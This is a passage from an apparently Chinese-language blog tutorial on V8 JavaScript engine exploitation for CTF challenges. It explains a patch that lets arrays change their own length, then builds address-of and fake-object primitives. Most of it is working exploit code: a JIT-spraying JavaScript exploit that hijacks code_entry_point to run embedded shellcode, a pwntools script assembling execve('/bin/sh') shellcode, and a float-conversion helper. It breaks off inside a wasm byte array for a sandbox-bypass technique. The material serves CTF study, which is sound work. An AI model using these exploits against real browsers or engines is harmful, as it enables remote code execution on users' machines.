Builtin::kArrayLen,</span><br><span class="line">+                          2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;reverse&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeReverse, 0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;shift&quot;,</span><br></pre></td></tr></table></figure></div>

<p>可以看出，这里在 v8 中添加了一个可以修改 <code>JSArray</code> 长度属性的操作 <code>len</code> 。</p>
<p>这里先实现一下 address of 和 fake object 两个利用原语，具体方法可以是越界写数组元素或伪造 <code>Map</code> 。</p>
<p>这里有几个需要注意的点：</p>
<ul>
<li>通过修改 <code>Map</code> 使得 <code>ObjectArray</code> 变为 <code>DoubleArray</code> 后可以以 double 形式读取到数组中的元素但是不能以 double 形式写入值，即数组的读和写的类型检查不同。如果想要能以 double 形式写入值需要伪造 <code>element</code> 的 <code>Map</code> 。</li>
<li>应当先触发 JIT 再实现两个利用原语，因为 JIT 会导致前面构造的 <code>Array</code> 的各个结构的相对位置发生变化。</li>
<li>通过 GC 将 Array 置于 Old Space 后 <code>elememt</code> 成员放到最后，不容易利用。</li>
<li>由于指针压缩导致成员大小是 4 字节，而 <code>DoubleArray</code> 是 8 字节写，因此需要注意尽量不要覆盖其它成员。</li>
</ul>
<p>首先有如下函数：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面这种形式的函数 JIT 后的汇编代码如下，显然其中的立即数是可以控制的，并且可以通过堆内任意地址写修改 <code>code_entry_point</code> 指向汇编代码中的立即数，因此可以像<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/llvm_pass_pwn/ciscn2022_satool" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一样在立即数中写 shellcode 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/5e33756474098f1771e925e3d38b4e76.png"
                      alt="在这里插入图片描述"
                ><br>这里需要注意的是 <code>vmovsd</code> 函数在后面 <code>QWORD PTR [rcx+offset]</code> 中的 <code>offset</code> 在从 0x7f 变为 0x87 的时候指令长度增加了 3 字节，因此需要注意需要修改 <code>jmp</code> 的跳转偏移或者避免使用 rcx 寄存器。因为 rcx 被用来写数据所以原本是指向可读写的内存，因此指向下面这条指令不会出错。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c31d9c0839fbe94e96957695e0ceb913.png"
                      alt="在这里插入图片描述"
                ><br>另外注意 shellcode 最终执行的是 <code>execve(&quot;/usr/bin/xcalc&quot;, &amp;&quot;/usr/bin/xcalc&quot;, &amp;&quot;DISPLAY=:0&quot;);</code> ，对应那些二级字符串指针的参数需要进行 0 截断。</p>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">oob_array.<span class="title function_">len</span>(<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">11</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(offset);</span><br><span class="line">    oob_array[<span class="number">11</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> double_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">18</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">18</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">18</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">18</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_offset = <span class="title function_">offset_of</span>(shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_offset = (<span class="title function_">read</span>(shellcode_offset + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>) + <span class="number">8n</span>;</span><br><span class="line">leak_data = <span class="title function_">read</span>(leak_offset);</span><br><span class="line"></span><br><span class="line">code = leak_data &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">code_entry_point = leak_data &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(leak_offset, code | ((code_entry_point + <span class="number">0x66n</span>) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] leak offset: &quot;</span> + <span class="title function_">hex</span>(leak_offset));</span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(shellcode);</span></span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<p>通常可以使用如下脚本生成 shellcode 。注意跳转距离可能会有变化，需要调整。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iss=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">global</span> iss</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(iss)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(x)))</span><br><span class="line">    jmp = <span class="string">b&#x27;\xeb\x0c&#x27;</span></span><br><span class="line">    <span class="comment"># if iss&lt;=11: &#x27;</span></span><br><span class="line">    <span class="comment"># else :jmp=b&quot;\xeb\x16&quot;</span></span><br><span class="line">    iss +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> u64(x.ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + jmp)</span><br><span class="line"><span class="comment">#orw flag.txt</span></span><br><span class="line"><span class="comment"># imm1 = [</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax,0x7478742e&quot;), # &quot;.txt&quot;</span></span><br><span class="line"><span class="comment">#    asm(&quot;push 0;shl rax,0x20&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;add rax,0x67616c66&quot;), # &quot;flag&quot;</span></span><br><span class="line"><span class="comment">#    asm(&quot;push rax&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov rdi, rsp; xor rsi, rsi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax, 2&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor edx, edx;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edi,3&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;lea rsi, [rsp-8]&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edx, 0x80&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor eax, eax;syscall;xor edi, edi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al, 1;syscall;&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al,59;syscall;&quot;)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0);</span></span><br><span class="line"><span class="comment"># imm1 = [</span></span><br><span class="line"><span class="comment">#    asm(&quot;push 0x67616c66&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov rdi, rsp; xor rsi, rsi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax, 2&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor edx, edx;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edi,3&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;lea rsi, [rsp-8]&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edx, 0x80&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor eax, eax;syscall;xor edi, edi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al, 1;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al,60;syscall;&quot;)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, &#123;&quot;cat&quot;, &quot;flag&quot;, NULL&#125;, 0);</span></span><br><span class="line">imm1 = [</span><br><span class="line">    asm(<span class="string">&quot;mov eax,0x7478742e&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push 0;shl rax,0x20&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;add rax,0x67616c66&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push rax;push 0x746163&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push 0&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;lea rax, [rsp+0x10];push rax&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;sub rax, 8; push rax&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov rsi, rsp&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov eax,0x68732f&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;shl rax, 0x20&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;add rax, 0x6e69622f&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push rax;mov rdi, rsp;&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov eax, 59&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;xor edx, edx;syscall&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov rdi,rsi&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;xor esi, esi&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;syscall&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imm1 = [convert(x) <span class="keyword">for</span> x <span class="keyword">in</span> imm1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sd <span class="keyword">in</span> imm1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;u2d(&#x27;</span>+<span class="built_in">str</span>(sd)+<span class="string">&quot;n&quot;</span>+<span class="string">&quot;),&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后使用如下脚本将生成的 shellcode 转为 浮点数。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> x = [</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996577893625528n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930873897669623914n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930951416110253384n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930838247832250448n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996698557186154n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930925778240310600n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996421403378504n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996698562857288n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996079408918456n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996696683430216n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930959146880009544n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996700016363600n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996077656554424n</span>),</span><br><span class="line">        <span class="title function_">u2d</span>(<span class="number">930996696216752689n</span>),        </span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; x.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x[i] + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">get_shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<h3 id="利用-WasmInstance-的全局变量"><a href="#利用-WasmInstance-的全局变量" class="headerlink" title="利用 WasmInstance 的全局变量"></a>利用 WasmInstance 的全局变量</h3><p>由于这种方法在较高版本中不能使用，这里以 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/sandbox_bypass/wasm_global" >DiceCTF2022 memory hole <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例进行介绍。<br>这个题目我查到的 commit 号为 <code>002e39e97a56a05dd200481ea04c74b8c0203acc</code> ，虽然没有 patch 成功，但是 patch 完的部分可以正常触发漏洞。</p>
<p>和上一个 demo 一样，这个题目也添加了一个修改数组长度的方法，因此可以像上一题一样实现 address of 和 fake object 利用原语以及堆内任意地址读写。然而 wasm 产生的 rwx 段不在这个 v8 堆内，因此我们需一个真正的任意地址写来在 rwx 段内写 shellcode 。</p>
<p>wasm 可以用来实现一些的功能，比如下面这个代码就可以实现对 wasm 定义的 global 的读写。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x7E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span 